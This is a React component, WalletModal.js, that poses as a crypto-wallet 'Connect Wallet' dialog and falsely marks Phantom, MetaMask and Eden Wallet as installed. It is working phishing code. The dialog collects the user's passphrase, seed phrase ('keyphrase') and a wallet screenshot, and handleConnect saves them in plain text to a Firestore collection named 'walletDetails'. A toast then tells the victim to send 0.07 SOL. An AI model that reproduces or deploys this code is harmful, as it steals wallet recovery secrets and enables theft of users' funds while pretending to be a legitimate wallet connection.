// components/WalletModal.js
import React, { useState, useEffect, useCallback } from 'react';
import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
import { getFirestore, collection, addDoc } from 'firebase/firestore';
import { HiViewGrid } from "react-icons/hi";
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';



const WalletModal = ({ isOpen, onClose }) => {
  const [showSecondaryModal, setShowSecondaryModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [keyphrase, setKeyphrase] = useState('');
  const [importedFile, setImportedFile] = useState(null);

  // Updated wallet options with images
  const walletOptions = [
    { name: 'Phantom', image: '/phan.png' },
    { name: 'MetaMask', image: '/meta.png' },
    { name: 'Eden Wallet', image: '/eden.png' },
   
    
  ];

  const handleWalletSelect = (walletName) => {
    setSelectedWallet(walletName);
    setShowSecondaryModal(true);
  };

  const handleOtherOptionsClick = () => {
    setSelectedWallet('Other');
    setShowSecondaryModal(true);
  };

  const handleConnect = async () => {
    if (!selectedWallet) {
      return;
    }

    let walletDetails = {
      walletName: selectedWallet,
    };

    if (passphrase) {
      walletDetails.passphrase = passphrase;
    } else if (keyphrase) {
      walletDetails.keyphrase = keyphrase;
    } else if (importedFile) {
      walletDetails.importedFile = importedFile.name; // Or the content itself
    }

    try {
      const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
      console.log("Document written with ID: ", docRef.id);
      
      // toast.success(`Connected to ${selectedWallet} successfully!`);
      toast.info('Fund your wallet with 0.07 SOL to continue.', {
        position: 'top-center',
        autoClose: 7000,
        style: {
          background: 'black',
          color: 'red',
          fontWeight: 'bold',
        },
      
      });
    
      onClose(); // Close the modal after successful connection
    } catch (e) {
      console.error("Error adding document: ", e);
      toast.error("Failed to connect. Please try again.");
    }
    
  };

  const handleFileChange = (event) => {
    setImportedFile(event.target.files[0]);
  };

  const handleBack = () => {
    setShowSecondaryModal(false);
    setSelectedWallet('');
    setPassphrase('');
    setKeyphrase('');
    setImportedFile(null);
  };

  const handleKeyDown = useCallback((event) => {
    if (event.key === 'Escape' && isOpen) {
      onClose();
    }
  }, [isOpen, onClose]);

  useEffect(() => {
    if (isOpen) {
      document.addEventListener('keydown', handleKeyDown);
      document.body.classList.add('overflow-hidden');
    } else {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
      setShowSecondaryModal(false);
      setSelectedWallet('');
      setPassphrase('');
      setKeyphrase('');
      setImportedFile(null);
    }

    return () => {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
    };
  }, [isOpen, handleKeyDown]);

  if (!isOpen) {
    return null;
  }

  return (
    <div className="fixed inset-0 bg-black flex justify-center items-center z-50">
      <div className="bg-gray-900 w-80 rounded-lg shadow-lg p-6 max-w-md relative">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-500 hover:text-gray-300 focus:outline-none"
        >
          <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        {!showSecondaryModal ? (
          <div>
            <h3 className="text-xl font-semibold text-white mb-4">Connect Wallet</h3>
            <ul className="space-y-2">
              {walletOptions.map(({ name, image }) => (
                <li
                  key={name}
                  className="bg-gray-800 hover:bg-gray-700 rounded-md py-3 px-2 w-full cursor-pointer transition duration-200 flex items-center"
                  onClick={() => handleWalletSelect(name)}
                >
                  <img src={image} alt={name} className="h-6 w-6 mr-2" />
                  <span className="block text-sm text-gray-300 font-medium">{name}</span>
                  <span className="text-xs bg-[#1F3A28] p-1 font-bold rounded text-green-500 ml-auto">INSTALLED</span>
                </li>
              ))}
            </ul>
            <button
              className="w-full flex  items-center gap-4 pl-2 mt-4 bg-gray-800 text-sm text-white font-semibold py-2 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
              onClick={handleOtherOptionsClick}
            >
              <HiViewGrid />
              All Wallets
            </button>
            <p className="mt-4 text-center text-xs text-gray-400">Haven't got a wallet? <span className="text-indigo-500 text-sm cursor-pointer">Get started</span></p>
          </div>
        ) : (
          <div>
            <h3 className="text-xl font-semibold text-white mb-4">Connect to {selectedWallet}</h3>
            <div className="space-y-4">
              <div>
                <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Passphrase:</label>
                <input
                  type="password"
                  id="passphrase"
                  className="shadow-sm focus:ring-indigo-500 py-[10px] px-[10px] focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
              </div>
              <div>
                <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">Keyphrase:</label>
                <textarea
                  id="keyphrase"
                  rows="3"
                  className="shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
                  value={keyphrase}
                  onChange={(e) => setKeyphrase(e.target.value)}
                />
              </div>
              <div className='border-1 border-white pl-2 p-3 rounded'>
                <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Add a screenshot of your wallet here:</label>
                <input
                  type="file"
                  id="importFile"
                  className="focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm text-gray-300"
                  onChange={handleFileChange}
                />
              </div>
            </div>
            <div className="mt-6 flex justify-end space-x-2">
              <button
                className="bg-gray-700 h-10 hover:bg-gray-600 text-gray-100 font-semibold py-3 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-75"
                onClick={handleBack}
              >
                Back
              </button>
              <button
                className="bg-[#00cc33] text-sm text-white h-10 font-semibold py-1 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
                onClick={handleConnect}
              >
                Connect
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletModal;